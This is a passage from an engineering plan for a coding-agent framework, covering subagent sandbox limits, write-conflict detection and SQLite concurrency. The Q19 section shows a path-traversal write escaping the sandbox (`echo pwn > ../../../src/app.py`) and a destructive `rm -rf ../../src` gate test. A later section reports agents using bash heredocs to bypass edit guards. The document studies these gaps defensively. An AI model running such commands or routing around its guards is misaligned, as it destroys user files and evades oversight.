  2. `SandboxHook.handle` for a real `fs_spawn_subagent` call:

     ```
     gate root=workspace_root (today)    -> ALLOW
     gate root=artifact_root (plan S5.6) -> ALLOW
     ```

  3. The executor, with `cwd` already set to the artifact root:

     ```
     subprocess.run("echo pwn > ../../../src/app.py", cwd=<artifact root>)
     parent file afterwards: 'pwn\n'
     ```

  **Mechanism (source-verified).** `workspace_root` is *not* a general write
  boundary in the bash gate. `evaluate_bash` (`bash_gate.py:73`) only passes it
  to `validate_command` (`validators.py:296`), which dispatches on the head
  token and returns a result for **`rm`, `chmod`, `git` only** — everything else
  returns `None`. A shell redirect classifies as `GENERAL_WRITE`
  (`bash_gate.py:170-189`), and with `allow_general_write=True` — the
  `SandboxHook` default (`builtin.py:101`) used by both production call sites
  (`cli.py:877`, `cli.py:1994`) — it is allowed **without any path check**.
  `cwd` is likewise not a boundary: `..` traverses out of it, and the command is
  run with `shell=True` (`subagent_runner.py:283`).

  So narrowing the root genuinely tightens `rm` / `chmod` / `git` (verified:
  `rm -rf ../../src` flips to DENY under the artifact root while
  `rm -rf ./report.md` stays ALLOW) but leaves the ordinary write path —
  redirects, `tee`, `python -c open(...,'w')` — completely open. Shipping the
  step as written would produce a **containment claim the code does not honour**,
  which is worse than today's honest absence of one: V24/V25 would be marked
  closed while the hole remains.

  **This does not block the rest of S5.6.** V18 (no main-workspace fallback),
  V19 (reject `isolated` at config load), V20 (surface cleanup failure), V21
  (atomic spawn admission) are independent of the containment mechanism and are
  implementable exactly as planned. Only **S5-P16** — *"subagent write outside
  artifact root denied"* — and the V24/V25 closure claim depend on Q19.

  **Options.**

  * **(a) Deny-by-default for spawned commands.** Pass
    `allow_general_write=False` when the gate is evaluating
    `fs_spawn_subagent`, so `GENERAL_WRITE` is refused unless a validator
    explicitly allows it. Smallest change, uses a flag that already exists, and
    matches the artifact-only use case (ADR-16 I-7.x: subagents produce reports
    and test output). Cost: a subagent can no longer write its report with a
    plain `>` redirect — it must return output on stdout, which the envelope
    already captures. **Needs confirmation that no shipped subagent flow relies
    on redirect writes.**
  * **(b) Extend the gate with redirect/target path extraction.** Teach the
    classifier to extract write targets from redirects and common writer
    commands and path-check them against the root. Genuinely closes the hole
    for bash, but it is a parser arms race (`>`, `>>`, `tee`, `dd`, `python -c`,
    `sh -c`, heredocs, `$(...)`) — the exact category of guard that looks strong
    and leaks.
  * **(c) Real OS-level containment** — run the subagent in a container/mount
    namespace with the artifact dir as the only writable mount. The only option
    that actually enforces the claim for arbitrary commands. Largest change;
    overlaps Option C of Q11-B (worktrees) and the existing container work.
  * **(d) Land S5.6 minus S5-P16, and state the limit honestly.** Ship V18–V21,
    set `cwd` and the gate root to the artifact dir as *defence in depth* and
    for `rm`/`chmod`/`git` containment, and explicitly record that a subagent
    running arbitrary bash is **not** confined — leaving V24/V25 open with the
    measurement above rather than falsely closed.

  **Recommendation: (a) + (d) together.** (a) closes the realistic case at
  near-zero cost and is the fail-closed posture the rest of S5 has taken; (d)
  keeps the documentation honest about what a shell gate can promise, and names
  (c) as the real fix. (b) is not recommended: a partial parser invites exactly
  the false confidence this question exists to prevent.

  **Until Q19 is answered, S5.6 proceeds with V18–V21 only** and
  `tests/test_s5_isolation_boundary.py` omits
  `test_subagent_write_outside_artifact_root_denied`, rather than asserting a
  containment the code cannot deliver.

  **UPDATE 2026-07-28 — operator chose (a)+(d); (a) was implemented and
  MEASURED TO BREAK THE VERIFIER. Reverted; shipping (d) only.**

  `allow_general_write=False` for `fs_spawn_subagent` was implemented and the
  realistic verifier workload put through it. `pytest` and friends are **not**
  in `classifier._READ_ONLY_TOKENS` (correctly — a test run writes caches,
  `.pytest_cache`, coverage files), so they classify as `GENERAL_WRITE`:

  ```
  verifier commands denied under option (a): 8/10
     DENY: pytest -q          DENY: pytest tests/ -x   DENY: python -m pytest
     DENY: make test          DENY: ruff check .       DENY: mypy src/
     DENY: go test ./...      DENY: ./run_tests.sh
  ```

  Only `ls`-style commands survive. The verifier role's entire purpose —
  *"cheap deterministic puzzle piece"* running tests and returning output
  (ADR-16 I-7.x) — is denied. The operator's answer to the accompanying
  question was *"not sure, keep it permissive for now"*, and this measurement
  converts that caution into a decision: (a) is **not shippable as specified**.

  A narrower variant (deny general-write *except* an allowlist of test
  runners) was considered and rejected: it is Q19 option (b) in disguise — an
  allowlist of "commands that write only where we think they write" — and
  `pytest --basetemp=../../src` shows why that confidence is not earned.

  **S5.6 therefore ships option (d) only:** V18, V19, V20, V21 land in full;
  the artifact root is wired as defence in depth and gives real containment for
  `rm`/`chmod`/`git`; **V24/V25 stay OPEN**, with the measurement above recorded
  so no one re-reads the plan and believes they are closed. Option (c) —
  OS-level containment, one writable mount — remains the only mechanism that
  would actually close them, and is the recommended follow-up.


- **Q18 — RESOLVED (operator: option (a), 2026-07-28). Landed as S5.4.1.**
  Fixed by scoping `detect_conflict` to writer identity; `BlackboardEntry`
  gained a `run_id` field (default `""`), both authority read paths stop
  discarding it, and the JSONL mirror is stamped from `self._run_id` so the
  degraded path cannot disagree with the authority. Verified: repeated
  `write_file` to one path now returns `ok, ok, ok` with the final content on
  disk (was `ok, conflict_detected, conflict_detected` with writes silently
  lost). Cross-run conflicts still deny. Gate: 2034 passed / 14 skipped, mypy
  strict clean (137 files), pylint 10.00/10.

  Kill-checks (disposable copy): KC-1 remove the `_is_same_writer` guard -> 2
  fail; KC-2 discard `run_id` on the read path -> 3 fail; KC-3 relax the
  predicate to `writer == old.run_id` -> **survived initially**, exposing a
  real gap (every test used an *attributed* writer, so unknown-vs-unknown was
  never exercised); test
  `test_unattributed_writer_does_not_match_unattributed_entry` was added and
  KC-3 now fails; KC-4 predicate always true -> 3 fail.

  Two legacy tests were re-authored per §6.0.1, not deleted:
  `test_write_file_conflict_uses_per_run_blackboard_authority` and
  `test_blackboard_conflict_matrix_and_linear_parent_policy` both wrote the
  "pre-existing" entry through the *same* Blackboard under test, so the denial
  they asserted was the self-conflict defect rather than the cross-writer
  conflict they are named for. Both now write it via a second Blackboard on
  the same authority DB; both still fail under KC-4.

  Original finding retained below for the record.

- **Q18 (original finding) — RAISED 2026-07-28 by S5.4 preflight.**
  **Same-agent sequential rewrite of one file is denied by the agent's own
  prior entry.** Measured, not inferred, on **pristine HEAD `9ae07f4`** with an
  isolated `HOME` (so this is *not* an S5.3 regression and *not* the V10 leak):

  ```
  write_file a.txt (#0) -> OK
  write_file a.txt (#1) -> conflict_detected
      "write/write overlap {'a.txt'} - concurrent without coordination"
      Conflicts: ['write-ok-<uuid>']      <- the tool's OWN previous entry
  write_file a.txt (#2) -> conflict_detected
  final content: 'v0\n'                   <- writes #1,#2 silently lost
  ```

  **Mechanism (source-verified).** `_write_blackboard_ok`
  (`write_file.py:114` *pre-S5; now `mutation_guard.record_mutation`,
  `mutation_guard.py:182` — §13.3*)
  appends a `file_version` entry with `write_set=[rel_path]` and
  `parent_id=None` after every successful write. `detect_conflict`
  (`blackboard.py:309`) queries **all** `file_version` entries via
  `query(type=...)` -> `query_blackboard_rows` -> `_blackboard_select`, which
  filters by `session_id` **only** - there is no `run_id`, no actor and no
  "is this me" predicate. `_should_check_conflict` (post-S5.3) is
  `new.parent_id != old.id`, and the tool never sets `parent_id`, so the check
  always runs. Write/write overlap is then trivially non-empty against the
  agent's own entry. `BlackboardEntry` has **no `run_id` field** at all
  (verified via `dataclasses.fields`), so the entry cannot currently express
  who wrote it even though the `blackboard` table *does* carry a `run_id`
  column (`session_db.py:219`).

  **Why this blocks S5.4.** S5.4 exists to give `edit_file` the same pre-write
  conflict check `write_file` has. Measured consequence of doing that as
  specified, on today's code:

  | scenario | today | after S5.4 as written |
  |---|---|---|
  | write x, then edit x | edit OK | **edit denied** |
  | edit x, then edit x again | both OK | **2nd edit denied** |
  | 3 sequential edits to x | all OK | **only the 1st succeeds** |

  Iterative single-file editing is the single most common coding-agent motion.
  Propagating the check unchanged would convert a latent `write_file` defect
  into a total loss of `edit_file` usability. S5.4's own exit criterion - "the
  positive case proves legitimate writes still succeed" - cannot be met while
  this holds, so the slice is **blocked, not merely risky**.

  **Note on S5-P5.** The plan's `S5-P5 "same-base conflict / write_file"` row is
  satisfied *today* by this self-conflict, i.e. the existing green signal is
  produced by the bug rather than by genuine two-agent detection. Any S5-P5 test
  must therefore be re-authored with two distinct writers (plan §6.0.1: old
  tests are inputs, not authority).

  **Options.**

  * **(a) Scope the conflict query to "not me".** Give `BlackboardEntry` a
    `run_id` (the column already exists) and have `detect_conflict` skip
    entries from the same `run_id`. Conflicts then mean what the contract says:
    *another* agent touched the path. Cost: one dataclass field + a read-path
    filter; the ADR-16 "no silent overwrite" guarantee is preserved across
    agents, which is the guarantee it was written for.
  * **(b) Chain via `parent_id`.** Each tool sets `parent_id` to the newest
    entry it observed for that path, making sequential same-path writes a
    linear chain that `_should_check_conflict` already exempts. Truest to the
    documented Q2 "linear chain" design; needs a "latest entry for path"
    lookup and is racy without one.
  * **(c) Ship S5.4 without the self-conflict fix.** Rejected: measured to
    break iterative editing outright.

  **Recommendation: (a), with (b) recorded as the upgrade path** - (a) is the
  smaller change, uses a column that already exists, and directly restores the
  contract's intent ("concurrent *without coordination*" = a *different* actor).

  **Cost of the fix.** ~1 dataclass field, 1 write-path plumb, 1 read-path
  filter, plus tests: same-run repeated writes allowed; cross-run same-path
  writes still denied; `edit_file` symmetric on both.

  ---

  **Industry research (operator-requested, 2026-07-28): how shipped coding
  agents treat this exact symptom.**

  This failure mode is not unique to us. It is the single most-reported
  Edit-tool defect in Claude Code, and the reports describe *our* symptom
  precisely: the agent's own prior edit trips the guard.

  * **anthropics/claude-code#48390** — *"Edit tool's 'modified since read' error
    ... triggers unnecessarily"*: the error fires *"when the modification was
    actually caused by Claude's own previous Edit on the same file in the same
    response."* Reported impact: 5-10 edits to one file per phase, of which
    *"2-4 typically race the cache and produce visible errors."* Their filed
    root cause is ours in different clothing: the write path does not tell the
    conflict detector *"that entry was me."* Their **Option A (preferred)** is
    *"after a successful Edit/Write, the tool should update its read-cache
    ... atomically"* — i.e. make the agent's own write self-consistent rather
    than loosening the guard.
  * **anthropics/claude-code#28383** — hard-blocking on any modification
    *"does not distinguish between external modifications"*. The maintainer-
    favoured remedy is the **anchor still matches** test: *"Apply the edit if
    the target `old_string` still exists in the modified file (the edit is
    still valid) ... most robust — if the `old_string` to be replaced still
    matches, the edit is safe regardless of what changed elsewhere."*
  * **anthropics/claude-code#33856** — once the guard trips it becomes
    **sticky**: subsequent edits keep failing *"even when the file is provably
    stable on disk (confirmed via md5 ... with a 2-second gap)"*. Cautionary
    evidence that a mis-scoped guard degrades into a permanently wedged tool.
  * **anthropics/claude-code#27941** — the opposite error: stale-write detected,
    *"logs telemetry ... BUT DOES NOT ABORT — continues to overwrite"*. Silent
    fail-open on a detected conflict. Confirms the direction S5.4 takes (deny,
    loudly) is right; only the *scope* of the predicate is in question.
  * **Reported user workaround** across all four threads: agents fall back to
    `bash`/`sed` heredocs to bypass the check. #48390 and the r/ClaudeCode
    thread both flag this as *"the real danger: bash edits have fewer
    guardrails."* A guard that misfires does not add safety, it **routes work
    around itself** — directly relevant to us, since `fs_run_bash` is a
    registered tool with no Blackboard check at all.
  * **Optimistic-concurrency canon** (and OpenMarkdown's agent MCP server,
    which ships *"section-scoped writes with optimistic concurrency"*): the
    concurrency token must be compared *per writer*. OCC detects *"changes
    since read"* by *another* transaction; a writer never conflicts with
    itself. Our `detect_conflict` currently has no writer identity at all, so
    it cannot express "since read **by someone else**".
  * **Worktree isolation** is the dominant industry answer for *cross-agent*
    conflicts (Claude Code, Codex, Cursor all support it). Note this is
    orthogonal and already our S5.6 topic (V18-V22): worktrees separate
    *different* agents, which is exactly the case option (a) preserves.

  **Convergent conclusion.** Every shipped implementation scopes the guard to
  *"changed by someone other than me"*, and every reported failure comes from a
  guard that could not tell self from other. Nobody solves it by deleting the
  guard (#27941 shows why), and nobody solves it by keeping the guard
  writer-blind (#48390/#33856 show why).

  **Recommendation: (a) run_id-scoped conflict detection, plus the #28383
  anchor-still-matches refinement for `edit_file`.**

  Option (a) is confirmed to be *smaller than the plan assumed* — verified on
  the running code, not read off the source:

  * the `blackboard` **table already has a `run_id` column**
    (`session_db.py:219`);
  * `Blackboard` already **holds** `self._run_id` (`blackboard.py:174`) and
    already **writes** it on every row (`blackboard.py:196`);
  * `_blackboard_row` already **returns** it (`session_db.py:830`, index 2),
    proven live: `query_blackboard_rows(...)[0]["run_id"] == "run-A"`.

  The value is therefore already persisted and already read back — it is
  discarded at exactly one place, `Blackboard.query()` (`blackboard.py:265`),
  because `BlackboardEntry` has no `run_id` field. The fix is to stop throwing
  away a value the substrate already carries, which is materially different
  from (and safer than) inventing new identity plumbing.

  Option (b) `parent_id` chaining is recorded as the **documented upgrade
  path** (same treatment as Q11-B Option C): it is the truer model of the Q2
  linear-chain design, but it needs a race-free "latest entry for this path"
  lookup, which is a bigger change than S5.4.1 should carry.

  **Sub-step S5.4.1** (per operator, 2026-07-28) lands this fix on its own,
  with its own kill-check, *before* S5.4 propagates the check to `edit_file`.
  Symmetry is only safe once the predicate is correct — otherwise S5.4 would
  faithfully copy a broken guard onto the most-used edit path.

  **Second-harness corroboration (opencode / aider), operator-requested.**
  Claude Code alone is weak evidence, so the same question was put to two
  independent harnesses. They converge on the same predicate.

  * **opencode** implements exactly the shape recommended here, and its guard
    is **session-scoped**: `FileTime.read(sessionID, file)` records the read
    and `FileTime.assert(sessionID, filepath)` validates it — the concurrency
    token is keyed by *who* is asking. Cross-session edits are denied; a
    session does not trip over itself. It adds a per-file promise-chain lock
    (`FileTime.withLock`) to serialise writers. This is option (a)'s predicate
    ("is this entry mine?") plus S5.6's isolation concern, in a shipped agent.
  * **opencode#11249** — when a *plugin* modifies a file, `FileTime` is not
    updated and edits then fail; the only escape is
    `OPENCODE_DISABLE_FILETIME_CHECK=1`, which the reporter notes *"disables
    ALL file modification safety checks ... reduces safety for concurrent
    edits."* Same lesson as claude-code#48390: a writer the guard cannot
    attribute produces a false conflict, and the pressure-release valve is a
    global off-switch — the guard gets disabled wholesale rather than fixed.
  * **opencode#5840** (maintainer tracking issue) — the in-memory `mtime`
    token is *itself* the wrong token: it breaks on undo/redo (git snapshots
    bump `mtime` though content is what the model expects) and on restart
    (state is lost). Their agreed long-term direction is **content hashing**:
    *"maintain a map of `filePath -> contentHash` ... the Edit tool would check
    if the current on-disk hash matches the expected hash ... if they match,
    the edit proceeds regardless of the timestamp."* Directly relevant: our
    `BlackboardEntry` **already carries `content_hash`**, so we are better
    positioned than opencode was — we do not need to add the mechanism they
    are migrating toward, only to scope the predicate by writer.
  * **aider** takes the complementary route and never maintains a staleness
    token at all: correctness comes from the **anchor** (`SEARCH/REPLACE`
    must match, tried perfect → whitespace-tolerant → fuzzy), and from
    committing pre-existing user edits as a *separate* "dirty commit" before
    applying AI edits — i.e. it makes authorship explicit rather than
    guessing. On failure it reflects the error back to the model (up to 3
    self-corrections) instead of hard-blocking. Our `edit_file._find_fuzzy`
    is already aider's anchor ladder, which is why S5.4's `edit_file` denial
    must be additive to the anchor check, not a replacement for it.

  **What the second harness changes about the recommendation: nothing, and it
  sharpens one point.** Two independently-built agents (opencode, Claude Code)
  both scope the guard by *writer identity* and both have public bug trails
  proving what happens when they cannot. The third (aider) avoids the problem
  by not keeping cross-call state and leaning on the anchor. All three agree
  the guard must never fire on the writer's own prior change. Option (a) is
  the minimal way to obtain that property here, and — unlike opencode — we
  already persist both the writer id (`run_id`) and a `content_hash`, so no
  new mechanism is introduced.


- **Q13 — RESOLVED (operator, 2026-07-28): the Blackboard is append-only.**
  **ADR-16 I-6.2/I-6.3** (`knowledge/adr/DIGEST.md:733`) states the Blackboard is
  *append-only, content-hashed, queryable, with `detect_conflict()`* and that
  there must be *no silent overwrite → fail code `conflict_detected`*. Under that
  reading `INSERT OR REPLACE` at `session_db.py:470,495` directly violates I-6.3
  and the fix is append-only with a `conflict_detected` failure. S5.0 confirms
  against the ADR-16 source file; raise Q13 only if that text conflicts.
- **Q14 — RESOLVED (operator, 2026-07-28): fail closed.** A DB holding
  pre-existing duplicate `event_id`s refuses to open with
  `event_id_duplicates_present` (§3.1). The operator will prune existing session
  state and re-run S4 from a clean box, so no migration path is required and no
  legacy-repair code is written. S5.0 still audits, to confirm the clean state.
- **Q11-B — RESOLVED (this plan, §3.2): Option A**, artifact dir at
  `<session_workspace>/.fa/subagents/<task_id>/`, one value shared by gate and
  executor. Option C (real worktree) is the documented upgrade path. S5.6 is
  unblocked.
- **Q17 — RAISED during S5.3 (does NOT block S5.3; scoped to S5/S7 hygiene).**
  A *second*, independent leak seam exists at `cli.py:128`
  (`SessionManager(state_root=Path.home() / ".fa", ...)`). It is not covered by
  the `default_state_root()` fix, because `_cmd_run` builds its manager from
  `Path.home()` directly. One test —
  `tests/test_cli.py::test_fa_run_returns_zero_on_clean_stop` — does not set
  `HOME` (its neighbours in the same file do), so it recreates
  `~/.fa/session-log/test-run/` on every run.

  Unlike Q16 this is **idempotent**: the directory is rewritten, not
  duplicate-keyed, so no test fails. It is a CT11 hygiene violation, not a
  correctness defect.

  **Research finding — this is a PRODUCTION defect, not test hygiene.**
  `scripts/fa-entrypoint.sh:214` already defines the deployment contract
  `state_root="${FA_STATE_ROOT:-${HOME}/.fa}"` and passes it to
  `python -m fa.session.manager provision --state-root ...`. **No Python code
  reads `FA_STATE_ROOT`.** Measured: with `FA_STATE_ROOT=/tmp/x` the entrypoint
  provisions `/tmp/x` while `cli.py:128` computes `~/.fa` — the operator gets a
  split-brain session where provisioning and `fa run` disagree about where the
  authority lives. The half-implemented contract is the root cause; the test
  leak is one symptom of it.

  Scope of the underlying issue: **15 independent `Path.home() / ".fa"`
  derivations** across `cli.py` (7), `state.py` (2), `config.py`,
  `global_history.py`, `pause.py`, `providers/config.py`, `observability.py`,
  `secret_paths.py`. Ten resolve at call time (env-overridable once a resolver
  exists); five are import-time constants (env change has no effect — the same
  V10 class already fixed once in S5.3).

  Options: **(a)** `monkeypatch.setenv("HOME")` on the one test — treats the
  symptom, leaves the operator contract broken, and the next test reintroduces
  it; **(b)** widen the conftest fixture to patch `cli.py` — patching a
  production call site from a global fixture hides real behaviour and would have
  masked this very finding; **(c)** **implement the contract**: one stdlib
  resolver `fa_state_root()` honouring `FA_STATE_ROOT` with an absolute-path
  guard, used by the call-time sites; import-time constants converted
  incrementally.

  Prototype verified: default `~/.fa`; `FA_STATE_ROOT=/tmp/x` -> `/tmp/x`
  (matches the entrypoint argument exactly); relative values ignored;
  unset restores the default. Zero new dependencies — the repo has neither
  `platformdirs` nor an XDG helper, and minimalism-first argues against adding
  one for a single resolver.

  **Recommendation (c)**, promoted to its own step **S5.4.5** (§5) rather than
  folded into S5.4: it touches 8 files across 6 modules, which would make the
  mutating-tool slice unreviewable. Not taken inside S5.3 — `tests/test_cli.py`
  and those modules are outside this step's allowed file list.

- **Q16 — RESOLVED during S5.3 (systemically, not per-site).**
  `tests/test_session_db_authority.py::test_write_file_conflict_uses_per_run_blackboard_authority`
  constructs `SessionState(workspace_root=tmp_path, run_id="run-1")` with no
  `log=`, so `state.py:368-372` falls back to the **shared**
  `DEFAULT_STATE_ROOT` (`~/.fa/session-log/run-1/`) instead of `tmp_path`. It
  writes blackboard id `existing-write` there on every run.

  `INSERT OR REPLACE` silently overwrote that leftover, so the leak was
  invisible. Append-only surfaces it: the test now passes on a clean box and
  fails on every subsequent run — proven by running it twice in a row.

  This is a **pre-existing CT11 violation** (V10, import-time
  `DEFAULT_STATE_ROOT`), not an S5.3 regression. The S5.3 behaviour is correct:
  a second write of the same id *should* fail.

  **Resolution — the one-line test fix was investigated and REJECTED.** The leak
  is not one test: a repo scan found **ten** tests constructing `SessionState`
  without `log=`, and eight of the ten directories in `~/.fa/session-log/`
  matched their `run_id`s exactly. Patching one site would leave nine leaking
  and the next test written that way reintroduces it.

  A `monkeypatch.setenv("HOME")` fixture was also measured and rejected: V10's
  import-time binding means changing `HOME` after `fa` is imported has no
  effect (verified — the constant still resolved to the real `~/.fa`).

  Adopted instead: **fix V10 itself.** `fa.inner_loop.state.default_state_root()`
  resolves at call time; the single production consumer (`state.py:394`) uses
  it; the module constant is retained for compatibility (Do#9). A narrow autouse
  fixture in `tests/conftest.py` then redirects that one seam per test.

  Scope was tightened once during implementation: a first version patched
  `Path.home` globally and broke **25** tests that legitimately assert
  home-relative constants, because those modules bind paths at import. Only the
  session-log root is redirected now.

  Evidence: the affected test passes on three consecutive runs, and a full suite
  against a deleted `~/.fa/session-log` leaves that tree absent apart from the
  separate Q17 seam.

- **Q6 — RESOLVED (operator, 2026-07-28): keep the `ev-NNNNNN` public form.**
  Robustness over cosmetics: gaps after a failed write are acceptable,
  duplicates are not. Either §3.1(d)-compliant strategy (`BEGIN IMMEDIATE`
  allocation, or derive-from-`lastrowid`) satisfies this; the executor picks one
  in S5.1 and records the measured evidence.

---

## 12. Review gate

Review pass completed 2026-07-28. Findings closed in this revision:

- [x] **11 parent-trajectory gaps** — Do#1/2/4b/6/9 and six exit criteria were
      unaddressed; now §1.2 regression pins, S5-G7, S5-CT7, S5-P17/18/19, and
      the S5.0 preflight step;
- [x] **SQLite logic error (a)** — "UNIQUE(event_id) scoped per session" was
      ambiguous and, read literally, wrong; §3.1(a) proves the correct shape;
- [x] **SQLite logic error (b)** — DDL-only change is a silent no-op on existing
      DBs, and indexing a DB with existing duplicates raises; §3.1(b) + Q14;
- [x] **5 of 6 steps had no exit criteria** — all six now have them;
- [x] **no step named a concrete test** — 26 named test functions (3 of them
      parametrised across both mutating tools) in 5 new files;
- [x] **4 missing §13 sections** — rollback/artifacts (§9), per-edit
      mechanism/rationale (§5), execution prompt (§10), SIZE (§0);
- [x] every §1.1 citation re-verified against the current tree;
- [x] S5-R7/R8 added for the two newly-identified risks;
- [x] S5-P20 added — EventLog/Blackboard single-authority identity was the one
      parent exit criterion with code (`state.py:358-361`) but no test.

### Second review round (different lens: "will the resulting code and tests be
production grade if an agent follows this literally?")

- [x] **R2-1 — the fix as written would cause silent data loss.** Adding
      `UNIQUE(session_id, event_id)` without allocating inside the insert
      transaction converts a duplicate id into a dropped event
      (`IntegrityError` on the losing writer). Proven both ways: constraint-only
      loses 1 of 2; allocate-in-transaction persists 20 of 20 with 0 duplicates.
      Closed by §3.1(c), the mandatory mechanism wording in S5.1, S5-P21, the
      `test_concurrent_appends_lose_no_events` test, and risk S5-R9.
- [x] **R2-2 — Q13 cited the wrong ADR.** The append-only invariant is
      **ADR-16 I-6.2/I-6.3**, not ADR-14/15. Under that text `INSERT OR REPLACE`
      violates I-6.3 directly, so Q13 is likely already answered rather than
      open. §11 and S5.0 step 4 updated.
- [x] **R2-3 — the plan did not transmit the tests-writing skill.** 8 of 12
      skill obligations (mock boundary, real `HookRegistry`, `FeatureFlags`,
      type-honest fixtures, thresholds-from-source, existence pre-check,
      no-mocked-dataclasses, mutation handoff, fixture reuse) were absent, so an
      executor would have produced plausible non-compliant tests. Closed by the
      new **§6.0 binding test-authoring contract** and risk S5-R10.
- [x] **R2-4 — concurrency test shape was unspecified.** Verified an in-process
      `threading.Barrier` reproduces V1 (3 duplicates, 2 threads), so no
      subprocess harness is needed; precedents named in §6.0.
- [x] **R2-5 — fixture duplication risk.** `tests/fixtures/session_wiring.py`
      already provides the factories S5 needs; §6.0 names them and forbids a
      third copy.

### Third review round (industry-practice lens)

- [x] **R3-1 — the mandated mechanism was still unsafe.** v2 said "serialized
      transaction under the existing `_write_lock`". `threading.Lock` is
      process-local; the production shape is separate processes. Measured over 5
      trials (6 procs × 5 appends): app-lock **lost 6/150**, `BEGIN IMMEDIATE`
      and rowid-derivation lost **0/150**. Closed by §3.1(d), which mandates
      `BEGIN IMMEDIATE` + bounded retry, and by the new mandatory multiprocess
      test S5-P22.
- [x] **R3-2 — the codebase already uses the documented footgun.** All six write
      paths (`session_db.py:164,280,324,466,670,703`) use bare `with conn:`,
      i.e. DEFERRED. Documented SQLite behaviour: a DEFERRED transaction that
      upgrades read→write returns `SQLITE_BUSY` **without honouring
      `busy_timeout`**. This is why `busy_timeout` alone (already set at
      `_sqlite_common.py:50`) did not protect the app-lock variant. Rails
      changed its SQLite adapter default to IMMEDIATE for the same reason.
- [x] **R3-3 — a threads-only test cannot falsify the wrong design.** The
      app-lock variant passes an in-process barrier test and still loses events.
      S5-P22 is therefore not optional.
- [x] **R3-4 — Q11-B specified** (§3.2) with three options compared; Option A
      adopted, Option C recorded as the upgrade path. S5.6 unblocked.
- [x] **R3-5 — Q6/Q13/Q14 settled** by operator decision and ADR-16 citation;
      no open question now blocks execution.

**Verdict: GO.** All four previously-open questions are resolved, the two
mechanisms that would have shipped defects (constraint-only, app-lock) are
closed with measured evidence and mandatory falsifying tests, and every step has
files, named tests, and exit criteria.

Execution begins at **Step S5.0** (preflight, no production edits). Q15 is the
only reserved escalation, and it is scoped to S5.6 alone.

---

## 13. Post-merge review — 2026-07-29

Fourth review round, run **after** the merge with a different question from
§12's three: *does the shipped code still satisfy this plan, and can a reader
execute from it today?* §12 reviewed the plan before execution; this reviews
plan-versus-reality.

**Verdict: PASS with three defects, all closed below.** The plan is
production-grade in structure — all seven implementation steps carry Intent ·
Mechanism · Production rationale · Failure behaviour · Files · named tests
mapped to `S5-P` rows · concrete Exit criteria. The 25-row path matrix gives
every row a kill-check target, and every row is referenced at least twice.

### 13.1 Parent-trajectory check

The parent (§Step S5, line 1574) names **14 exit criteria** and **6
kill-checks**. Mapped against this plan and the merged tree:

* all 14 exit criteria are represented — the seven that S3/S4 had already
  confirmed fixed are carried as §1.2 *regression pins* (S5-G7) rather than
  re-implemented, which is the correct treatment;
* the parent's four §Do-not items are honoured: no telemetry migration, no
  second session DB under `workspace/.fa/blackboard`, no hidden JSONL
  authority (KC5 proves it), and the candidate patch was not blindly applied.

Suite state: `tests/test_s5_*.py` → **82 passed, 1 xfailed** (the xfail is the
Q19 record, by design).

### 13.2 Parent kill-checks re-measured — all six bite

Not carried over from the execution records; re-run against the current tree
with `scripts/mutation_sweep.py` (whole suite as the oracle):

| Parent kill-check | Mutation applied | Result |
|---|---|---|
| remove the authoritative DB write | `append_event_row_allocating` → literal id | **CAUGHT** (15 failed) |
| remove same-DB Blackboard injection | drop the `session_db` parameter | **CAUGHT** (6 failed) |
| replace DB allocation semantics | `BEGIN IMMEDIATE` → `BEGIN` | **CAUGHT** (1 failed) |
| move counters before commit | delete the `kind_counts` increment | **CAUGHT** (3 failed) |
| restore hidden JSONL fallback | drop `self._injected_session_db or` | **CAUGHT** (3 failed) |
| restore `INSERT OR REPLACE` | on the **live** blackboard insert | **CAUGHT** (1 failed) |

**Method note worth keeping.** The first `INSERT OR REPLACE` attempt reported
SURVIVED — because `str.replace(..., 1)` hit the **legacy-schema** branch
(`session_db.py:653`), not the live one (`:678`). The mutation was wrong, not
the code. A first-occurrence textual mutation on a file with a
legacy/current branch pair silently tests the dead path; anchor such mutations
on a column list or another branch-unique token.

### 13.3 R1 — file:line anchors have drifted *(closed: re-resolved below)*

**Severity: material for executability.** The plan carries **79** `file:line`
references. None points past EOF, but the `state.py` anchors have moved by up
to **+59 lines** since the merge (S6 added `EventLog.redactor`; S6.6 added
tests). A reader following §1.2 lands in a docstring.

Re-resolved by content, 2026-07-29:

| §1.2 pin | Plan says | Actual now | Test that pins it |
|---|---|---|---|
| mismatched explicit `session_db` rejected | `state.py:157-161` | `state.py:180` | `test_session_db_authority.py` |
| EventLog/Blackboard one authority | `state.py:358-361` | `state.py:417` | `test_s5_observability_authority.py` |
| run-scoped reads | `state.py:245` | `state.py:295` | `test_cli.py` |
| mirror failure ⇒ no mirror-ahead | `state.py:192-198` | `state.py:288` | `test_s5_observability_authority.py:131` |
| stats: no DB creation on read | `stats.py:289` | `stats.py:285` | `test_cli.py:996` |
| clean-cutover legacy rejection | `cli.py:2483` **`legacy_unsupported`** | `cli.py:2482` **`legacy_trace_unsupported`** | `test_cli.py:996` |
| run-id reuse rejected | `manager.py:394,401` | unchanged | `test_session_lifecycle.py` |

Two things this surfaced. The plan's `legacy_unsupported` identifier **never
existed** in the shipped code — the real code is `legacy_trace_unsupported`, so
§1.2's "existing test: none found" was searching for the wrong string; the
behaviour *is* tested at `test_cli.py:996`, including the no-write property.
And all seven pins have tests, so S5-G7 is genuinely met.

### 13.4 R2 — the R3-2 finding was only partly acted on *(new defect, scoped)*

§12 R3-2 recorded that **all six** write paths use bare `with conn:`
(DEFERRED), and that a DEFERRED read→write upgrade returns `SQLITE_BUSY`
*without honouring* `busy_timeout`. S5 then fixed **one** path
(`append_event_row_allocating`, `session_db.py:409`). The review text does not
say the other five were assessed, so this reads as an unfinished finding.

Measured, rather than assumed:

* four of the remaining five are **write-only** transactions
  (`write_blackboard_row`, `append_event_row`, `set_meta`,
  `reserve_run_binding`) — no read→write upgrade, so the footgun does not
  apply. Probe: 6 processes × 5 `write_blackboard_row` = **30 attempted, 30
  persisted, 0 lost**;
* `_ensure_identity` (`session_db.py:303`) **does** read-then-write inside a
  DEFERRED transaction — the exact shape R3-2 describes;
* `_init_current_schema` (`:262`) is the DDL creator and is the one that
  actually fails: **6 of 30 concurrent first-opens** of a *fresh* DB raise
  `session_db_init_failed: database is locked`.

**Correctly bounded, and this is why it is not a P1.** Once the DB exists,
concurrent opens are clean: **0 failures in 40**. Production never hits the
window, because `SessionManager._new_session` serialises creation with
`session_dir.mkdir(parents=True, exist_ok=False)` (`manager.py:252`) — an
atomic filesystem primitive, so exactly one process creates a session
namespace.

A partial fix was prototyped (an `_immediate_transaction` helper on
`_ensure_identity`) and **reverted**: it reduced failures 6→3 but did not
eliminate them, which proved `_ensure_identity` was a symptom and
